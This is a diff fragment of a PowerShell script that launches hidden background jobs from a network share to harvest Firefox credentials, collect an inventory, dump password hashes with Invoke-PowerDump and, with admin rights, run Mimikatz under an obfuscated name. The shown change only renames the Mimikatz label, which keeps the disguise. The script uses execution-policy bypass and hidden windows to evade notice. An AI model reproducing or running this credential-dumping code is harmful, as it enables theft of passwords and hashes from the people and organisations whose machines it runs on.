@@ -77,7 +77,7 @@ Write-Host "FireFoxCred" ; start-job -RunAs32 -ArgumentList $SHARE {param($SHARE
 Write-Host "Inventory" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1} -ErrorAction SilentlyContinue | Out-Null
 if ($isAdmin) {
     Write-Host "Hashes" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1} -ErrorAction SilentlyContinue | Out-Null
-    Write-Host "M1m1k@tz" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\invoke-m1m1d0gz.ps1} -ErrorAction SilentlyContinue | Out-Null
+    Write-Host "m1m1d0gz" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\invoke-m1m1d0gz.ps1} -ErrorAction SilentlyContinue | Out-Null
 }
 Write-host "... Wait for end of jobs"
 # Wait for all jobs
